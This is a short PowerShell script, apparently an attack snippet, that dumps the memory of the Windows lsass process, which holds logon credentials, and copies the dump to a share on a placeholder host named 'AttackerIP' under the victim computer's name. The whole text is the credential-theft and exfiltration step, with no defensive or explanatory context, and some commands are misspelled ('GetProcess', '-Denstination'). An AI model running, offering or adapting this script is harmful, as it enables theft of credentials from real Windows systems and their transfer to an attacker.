Import-Module c:\temp\MiniDump.ps1

Out-Minidump -DumpFilePath c:\temp -Process (GetProcess -id (Get-process lsass | select -expand id))
start-sleep 10
$name = $env:computername
cp -Path "c:\temp\lsass*" -Denstination "\\AttackerIP\Share\$name.dmp"
